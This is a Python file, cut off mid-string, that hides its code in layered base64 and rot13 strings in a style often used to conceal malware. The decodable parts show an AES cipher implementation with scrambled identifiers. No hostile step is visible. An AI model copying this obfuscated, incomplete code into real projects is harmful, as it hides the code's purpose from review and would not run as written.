import base64, codecs; magic = 'aW1wb3J0IHJhbmRvbSBhcyBfTzBPMDAwMDBPME9PMDBPMCAjbGluZToyCmZyb20gaXRlcnRvb2xzIGltcG9ydCBjaGFpbiBhcyBPT08wTzAwT08wT08wTzAwMCwgY3ljbGUgICMgbGluZTo0Ck8wTzBPMDBPTzBPTzBPMDAwID0gcmFuZ2UKRUNCID0xICNsaW5lOjcKQ0JDID0yICNsaW5lOjgKX08wTzAwMDAwTzBPT08wME8wID1bWzB4NzQgLDB4NkIgLDB4NDEgLDB4RUUgLDB4ODMgLDB4MzUgLDB4RDQgLDB4MjQgLDB4NUMgLDB4REEgLDB4OTkgLDB4MzggLDB4RTggLDB4M0EgLDB4RTkgLDB4QkEgXSxbMHhCQiAsMHg5MyAsMHgzRCAsMHhEMCAsMHg5QyAsMHgwMCAsMHg0RSAsMHhEMyAsMHgxRCAsMHg3QSAsMHhDOSAsMHgxMCAsMHg0NiAsMHhENyAsMHhBNSAsMHgyNiBdLFsweDVEICwweDVBICwweDYzICwweDQ1ICwweDU2ICwweERGICwweEExICwweDlFICwweDAxICwweENFICwweDI5ICwweDYwICwweEM0ICwweDJDICwweDU4ICwweDYyIF0sWzB4QzUgLDB4QUMgLDB4QTIgLDB4MUYgLDB4N0IgLDB4NDkgLDB4RUEgLDB4M0IgLDB4NjkgLDB4NDAgLDB4NkUgLDB4NzkgLDB4NDggLDB4NkEgLDB4QzEgLDB4MTQgXSxbMHhGRSAsMHg4QiAsMHgzMSAsMHg2QyAsMHg3OCAsMHhDOCAsMHg5MCAsMHhCQyAsMHhBQSAsMHgxQiAsMHhDMyAsMHgxNSAsMHg3RSAsMHg3MSAsMHg0QyAsMHhEMiBdLFsweDlEICwweDgwICwweEI0ICwweEFFICwweEEzICwweDlGICwweDgxICwweDM0ICwweDU0ICwweERFICwweDIxICwweDY0ICwweDdDICwweDcwICwweENDICwweDI4IF0sWzB4RTAgLDB4M0UgLDB4NTEgLDB4RTYgLDB4ODcgLDB4OEQgLDB4ODggLDB4QjAgLDB4MTYgLDB4RkYgLDB4MEIgLDB4Q0IgLDB4MTEgLDB4QzYgLDB4MkQgLDB4RDggXSxbMHg5OCAsMHhCOCAsMHgxMiAsMHg0NyAsMHg1NyAsMHg1RiAsMHg1QiAsMHhFMyAsMHhCRiAsMHgyQiAsMHg2MSAsMHg0NCAsMHhENiAsMHgyNSAsMHhEQyAsMHgyMCBdLFsweEU0ICwweDg2ICwweDBEICwweDcyICwweENEICwweEE4ICwweDFBICwweDQzICwweEVGICwweDAzICwweENGICwweEE5ICwweDlBICwweEI5ICwweDkyICwweEJEIF0sWzB4MkEgLDB4RTEgLDB4QkUgLDB4QUIgLDB4OUIgLDB4MzkgLDB4NjggLDB4QzAgLDB4OTQgLDB4MDQgLDB4RjYgLDB4OEYgLDB4ODkgLDB4MzAgLDB4RUMgLDB4ODIgXSxbMHhCNSAsMHgyRSAsMHg1OSAsMHhFMiAsMHgzRiAsMHhEMSAsMHgxQyAsMHhGQSAsMHgzMyAsMHg2RCAsMHhGOCAsMHgzMiAsMHhFRCAsMHgwMiAsMHg0RiAsMHg1MyBdLFsweEU3ICwweDA3ICwweDc3ICwweEY1ICwweDBFICwweEYzICwweEI3ICwweDJGICwweEQ5ICwweDE4ICwweDQyICwweDZGICwweEY5ICwweEIyICwweDE3ICwweDdGIF0sWzB4RjEgLDB4QjYgLDB4QUYgLDB4MjMgLDB4NjUgLDB4RkMgLDB4OEEgLDB4QjEgLDB4OTYgLDB4MDUgLDB4NzYgLDB4NzUgLDB4RjQgLDB4OEUgLDB4MDkgLDB4Q0EgXSxbMHg5MSAsMHgzQyAsMHg1MCAsMHg2NiAsMHg3RCAsMHhGMCAsMHgzNiAsMHg1NSAsMHg1RSAsMHhEQiAsMHgxOSAsMHhDMiAsMHg5NSAsMHg4NCAsMHgwQyAsMHhGMiBdLFsweDM3ICwweEQ1ICwweEE0ICwweEE2ICwweEE3ICwweDI3ICwweEREICwweEEwICwweDFFICwweEZCICwweEIzICwweDk3ICwweDg1ICwweDhDICwweDA4ICwweDRBIF0sXSNsaW5lOjI2Ckludl9fTzBPMDAwMDBPME9PTzAwTzAgPVtbMHgyNSAsMHgzOCAsMHhiZCAsMHg5OSAsMHhhOSAsMHhkOSAsMHgxNSAsMHhjMSAsMHhmZSAsMHhkZSAsMHgxZCAsMHg3YSAsMHhlZSAsMHg5MiAsMHhjNCAsMHgxNyBdLFsweDJiICwweDdjICwweDgyICwweDEwICwweDRmICwweDViICwweDc4ICwweGNlICwweGM5ICwweGVhICwweDk2ICwweDU5ICwweGI2ICwweDI4ICwweGY4ICwweDQzIF0sWzB4OGYgLDB4NmEgLDB4MTMgLDB4ZDMgLDB4NyAsMHg4ZCAsMHgyZiAsMHhmNSAsMHg2ZiAsMHgzYSAsMHhhMCAsMHg4OSAsMHgzZCAsMHg3ZSAsMHhiMSAsMHhjNyBdLFsweGFkICwweDUyICwweGJiICwweGI4ICwweDY3ICwweDUgLDB4ZTYgLDB4ZjAgLDB4YiAsMHhhNSAsMHhkICwweDQ3ICwweGUxICwweDIyICwweDcxICwweGI0IF0sWzB4NDkgLDB4MiAsMHhjYSAsMHg5NyAsMHg4YiAsMHgzMyAsMHgyYyAsMHg4MyAsMHg0YyAsMHg0NSAsMHhmZiAsMHgxZSAsMHg1ZSAsMHgxOSAsMHgyNiAsMHhiZSBdLFsweGUyICwweDcyICwweDFhICwweGJmICwweDY4ICwweGU3ICwweDM0ICwweDg0ICwweDNlICwweGIyICwweDMxICwweDg2ICwweDggLDB4MzAgLDB4ZTggLDB4ODUgXSxbMHgzYiAsMHg4YSAsMHgzZiAsMHgzMiAsMHg2YiAsMHhkNCAsMHhlMyAsMHgxYiAsMHhhNiAsMHg0OCAsMHg0ZCAsMHgxICwweDUzICwweGI5ICwweDRhICwweGNiIF0sWzB4NmQgLDB4NWQgLDB4OTMgLDB4MTggLDB4MCAsMHhkYiAsMHhkYSAsMHhjMiAsMHg1NCAsMHg0YiAsMHgyOSAsMHg0NCAsMHg2YyAsMHhlNCAsMHg1YyAsMHhjZiBdLFsweDYxICwweDY2ICwweGFmICwweDQgLDB4ZWQgLDB4ZmMgLDB4OTEgLDB4NzQgLDB4NzYgLDB4YWMgLDB4ZDYgLDB4NTEgLDB4ZmQgLDB4NzUgLDB4ZGQgLDB4YWIgXSxbMHg1NiAsMHhlMCAsMHg5ZSAsMHgyMSAsMHhhOCAsMHhlYyAsMHhkOCAsMHhmYiAsMHg4MCAsMHhhICwweDljICwweGE0ICwweDI0ICwweDYwICwweDM3ICwweDY1IF0sWzB4ZjcgLDB4MzYgLDB4NDIgLDB4NjQgLDB4ZjIgLDB4MmUgLDB4ZjMgLDB4ZjQgLDB4OTUgLDB4OWIgLDB4NTggLDB4YTMgLDB4NDEgLDB4MTIgLDB4NjMgLDB4ZDIgXSxbMHg3NyAsMHhkNyAsMHhjZCAsMHhmYSAsMHg2MiAsMHhiMCAsMHhkMSAsMHhjNiAsMHg4MSAsMHg5ZCAsMHhmICwweDIwICwweDU3ICwweDlmICwweGEyICwweDg4IF0sWzB4YTcgLDB4NGUgLDB4ZWIgLC0xICwweDNjICwweDQwICwweDdkICwweDExICwweDU1ICwweDJhICwweGRmICwweDdiICwweDZlICwweDk0ICwweDM5ICwweDlhIF0sWzB4MjMgLDB4YjUgLDB4NWYgLDB4MjcgLDB4NiAsMHhmMSAsMHg4YyAsMHgyZCAsMHg3ZiAsMHhjOCAsMHg5ICwweGU5ICwweDhlICwweGY2ICwweDY5ICwweDM1IF0sWzB4NzAgLDB4YTEgLDB4YjMgLDB4ODcgLDB4OTAgLDB4MTQgLDB4NzMgLDB4YzAgLDB4YyAsMHhlICwweDQ2ICwweDFmICwweGFlICwweGJjICwweDMgLDB4OTggXSxbMHhlNSAsMHhkMCAsMHhlZiAsMHhjNSAsMHhkYyAsMHhjMyAsMHhhYSAsMHgxNiAsMHhiYSAsMHhjYyAsMHhiNyAsMHhmOSAsMHhkNSAsMHgxYyAsMHg1MCAsMHg3OSBdXSNsaW5lOjQ1ClJjb24gPSgweDAxICwweDAyICwweDA0ICwweDA4ICwweDEwICwweDIwICwweDQwICwweDgwICwweDFiICwweDM2ICwweDZjICwweGQ4ICwweGFiICwweDRkICwweDlhICwweDJmICwweDVlICwweGJjICwweDYzICwweGM2ICwweDk3ICwweDM1ICwweDZhICwweGQ0ICwweGIzICwweDdkICwweGZhICwweGVmICwweGM1ICwweDkxICwpI2xpbmU6NTMKZGVmIHh0aW1lIChPMDBPT09PT09PT08wT09PMCApOnJldHVybiAoKChPMDBPT09PT09PT08wT09PMCA8PDEgKV4weDFCICkmMHhGRiApaWYgKE8wME9PT09PT09PTzBPT08wICYweDgwICllbHNlIChPMDBPT09PT09PT08wT09PMCA8PDEgKSNsaW5lOjU2CmRlZiBfT08wT09PT08wMDAwME8wMDAgKE9PTzBPMDBPTzBPTzBPME8wICxPME8wMDAwMDBPT09PTzBPMCApOiNsaW5lOjU5CiAgICAiIiNsaW5lOjY1CiAgICBPMDBPMDBPME9PTzBPME8wMCAsTzAwT09PMDAwTzAwME9PME8gPWRpdm1vZCAobGVuIChPT08wTzAwT08wT08wTzBPMCApLE8wTzAwMDAwME9PT09PME8wICkjbGluZTo2NgogICAgcmV0dXJuIGxpc3QgKE9PTzBPMDBPTzBPTzBPME8wIFtPMDAwME9PT08wTzAwTzAwMCAqTzAwTzAwTzBPT08wTzBPMDAgK21pbiAoTzAwMDBPT09PME8wME8wMDAgLE8wME9PTzAwME8wMDBPTzBPICk6KE8wMDAwT09PTzBPMDBPMDAwICsxICkqTzAwTzAwTzBPT08wTzBPMDAgK21pbiAoTzAwMDBPT09PME8wME8wMDAgKzEgLE8wME9PTzAwME8wMDBPTzBPICldZm9yIE8wMDAwT09PTzBPMDBPMDAwIGluIE8wTzBPMDBPTzBPTzBPMDAwKE8wTzAwMDAwME9PT09PME8wICkpI2xpbmU6NjcKZGVmIF9PMDAwMDAwT08wT09PME9PTyAoTzAwT09PME8wTzAwT08wME8gLE8wT08wTzBPME9PT08wMDAwICk6I2xpbmU6NzAKICAgICIiI2xpbmU6NzUKICAgIGZvciBPT08wT08wT09PME8wT09PMCBpbiBPME8wTzAwT08wT08wTzAwMCgwICxsZW4gKE8wME9PTzBPME8wME9PMDBPICksTzBPTzBPME8wT09PTzAwMDAgKTojbGluZTo3NgogICAgICAgIHlpZWxkIE8wME9PTzBPME8wME9PMDBPIFtPT08wT08wT09PME8wT09PMCA6T09PME9PME9PTzBPME9PTzAgK08wT08wTzBPME9PT08wMDAwIF0jbGluZTo3NwpkZWYgX09PME8wME9PMDAwMDBPME8wIChPMDBPTzAwME9PT08wT08wMCAsT08wME8wME8wTzAwT08wT08gKTojbGluZTo4MAogICAgIiIjbGluZTo4NgogICAgTzAwT08wMDBPT09PME9PMDAgPVtfX08wT08wMDBPT08wME8wME8wIChPME9PMDBPTzBPT09PTzBPMCAsX08wTzAwMDAwTzBPT08wME8wIClmb3IgTzBPTzAwT08wT09PT08wTzAgaW4gTzAwT08wMDBPT09PME9PMDAgWzEgOl0rW08wME9PMDAwT09PTzBPTzAwIFswIF1dXSNsaW5lOjg3CiAgICByZXR1cm4gW08wME9PMDAwT09PTzBPTzAwIFswIF1eT08wME8wME8wTzAwT08wT08gXStPMDBPTzAwME9PT08wT08wMCBbMSA6XSNsaW5lOjg4CmRlZiBfX08wT08wMDBPT08wME8wME8wIChPTzBPME8wTzAwME9PT08wTyAsTzBPMDAwMDAwME9PT08wMDAgKTojbGluZTo5MQogICAgIiIjbGluZTo5NwogICAgT08wTzBPME8wMDBPT09PME8gPWhleCAoT08wTzBPME8wMDBPT09PME8gKVsyIDpdI2xpbmU6OTgKICAgIGlmIGxlbiAoT08wTzBPME8wMDBPT09PME8gKT09MSA6I2xpbmU6OTkKICAgICAgICBPTzBPME8wTzAwME9PT08wTyA9JzAnK09PME8wTzBPMDAwT09PTzBPICNsaW5lOjEwMAogICAgT08wMDBPTzAwMDAwTzBPME8gLE9PT08wMDAwMDAwTzBPMDBPID1saXN0IChPTzBPME8wTz'; love = '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'; god = 'MCAoT08wME8wTzBPT08wMDAwME8gLE8wMDAwT08wT09PTzBPT08wICkjbGluZToxNjUKICAgIE9PMDBPME8wT09PMDAwMDBPID1fTzAwMDBPME9PT08wT09PMDAgKE9PMDBPME8wT09PMDAwMDBPICkjbGluZToxNjYKICAgIHJldHVybiBPTzAwTzBPME9PTzAwMDAwTyAjbGluZToxNjcKX08wMDAwMDBPME9PTzAwTzAgPVsxNSAsMjQ3ICw2ICwyMjkgLDM0ICwxNzMgLDE5OSAsMTkgXSNsaW5lOjE3MApkZWYgX19PMDAwMDAwMDAwME9PTzBPMCAoTzAwME9PME8wME8wMDAwTzAgKTojbGluZToxNzMKICAgICIiI2xpbmU6MTc4CiAgICBPME8wMDBPME8wME9PT09PMCA9TzAwME9PME8wME8wMDAwTzAgWzAgXV5PMDAwT08wTzAwTzAwMDBPMCBbMSBdXk8wMDBPTzBPMDBPMDAwME8wIFsyIF1eTzAwME9PME8wME8wMDAwTzAgWzMgXSNsaW5lOjE3OQogICAgT09PME8wMDBPMDAwTzAwMDAgPU8wMDBPTzBPMDBPMDAwME8wIFswIF0jbGluZToxODAKICAgIE8wMDBPTzBPMDBPMDAwME8wIFswIF1ePU8wTzAwME8wTzAwT09PT08wIF54dGltZSAoTzAwME9PME8wME8wMDAwTzAgWzAgXV5PMDAwT08wTzAwTzAwMDBPMCBbMSBdKSNsaW5lOjE4MQogICAgTzAwME9PME8wME8wMDAwTzAgWzEgXV49TzBPMDAwTzBPMDBPT09PTzAgXnh0aW1lIChPMDAwT08wTzAwTzAwMDBPMCBbMSBdXk8wMDBPTzBPMDBPMDAwME8wIFsyIF0pI2xpbmU6MTgyCiAgICBPMDAwT08wTzAwTzAwMDBPMCBbMiBdXj1PME8wMDBPME8wME9PT09PMCBeeHRpbWUgKE8wMDBPTzBPMDBPMDAwME8wIFsyIF1eTzAwME9PME8wME8wMDAwTzAgWzMgXSkjbGluZToxODMKICAgIE8wMDBPTzBPMDBPMDAwME8wIFszIF1ePU8wTzAwME8wTzAwT09PT08wIF54dGltZSAoTzAwME9PME8wME8wMDAwTzAgWzMgXV5PT08wTzAwME8wMDBPMDAwMCApI2xpbmU6MTg0CiAgICByZXR1cm4gTzAwME9PME8wME8wMDAwTzAgI2xpbmU6MTg1CmRlZiBfT08wTzAwT09PMDBPTzAwMDAgKE9PTzAwME9PTzBPTzAwMDBPICk6I2xpbmU6MTg4CiAgICAiIiNsaW5lOjE5MwogICAgcmV0dXJuIFtfX08wMDAwMDAwMDAwT09PME8wIChPMDAwTzAwMDAwTzBPMDAwMCApZm9yIE8wMDBPMDAwMDBPME8wMDAwIGluIE9PTzAwME9PTzBPTzAwMDBPIF0jbGluZToxOTQKZGVmIF9PMDAwME8wT09PTzBPT08wMCAoT09PTzBPTzAwME9PTzBPME8gKTojbGluZToxOTcKICAgICIiI2xpbmU6MjAyCiAgICBmb3IgTzAwT08wT09PT08wTzBPTzAgaW4gT09PTzBPTzAwME9PTzBPME8gOiNsaW5lOjIwMwogICAgICAgIE8wTzBPME8wT09PMDBPMDBPID14dGltZSAoeHRpbWUgKE8wME9PME9PT09PME8wT08wIFswIF1eTzAwT08wT09PT08wTzBPTzAgWzIgXSkpI2xpbmU6MjA0CiAgICAgICAgT08wT09PMDAwMDBPT09PT08gPXh0aW1lICh4dGltZSAoTzAwT08wT09PT08wTzBPTzAgWzEgXV5PMDBPTzBPT09PTzBPME9PMCBbMyBdKSkjbGluZToyMDUKICAgICAgICBPMDBPTzBPT09PTzBPME9PMCBbMCBdXj1PME8wTzBPME9PTzAwTzAwTyAjbGluZToyMDYKICAgICAgICBPMDBPTzBPT09PTzBPME9PMCBbMSBdXj1PTzBPT08wMDAwME9PT09PTyAjbGluZToyMDcKICAgICAgICBPMDBPTzBPT09PTzBPME9PMCBbMiBdXj1PME8wTzBPME9PTzAwTzAwTyAjbGluZToyMDgKICAgICAgICBPMDBPTzBPT09PTzBPME9PMCBbMyBdXj1PTzBPT08wMDAwME9PT09PTyAjbGluZToyMDlfTzBPMDAwMDBPME9PT09PTzAKICAgIHJldHVybiBfT08wTzAwT09PMDBPTzAwMDAgKE9PT08wT08wMDBPT08wTzBPICkjbGluZToyMTAKSSA9MyAjbGluZToyMTMKZGVmIF9PME8wMDAwME9PT09PT09PMCAoTzAwTzBPTzBPMDBPMDAwT08gLE9PTzAwMDBPTzBPTzAwT08wICk6I2xpbmU6MjE2CiAgICAiIiNsaW5lOjIyMgogICAgT09PMDAwTzBPTzBPME9PME8gPVtdI2xpbmU6MjIzCiAgICBmb3IgTzBPT09PME8wTzBPME9PT08gLE9PT08wT08wTzAwMDAwT09PIGluIHppcCAoTzAwTzBPTzBPMDBPMDAwT08gLE9PTzAwMDBPTzBPTzAw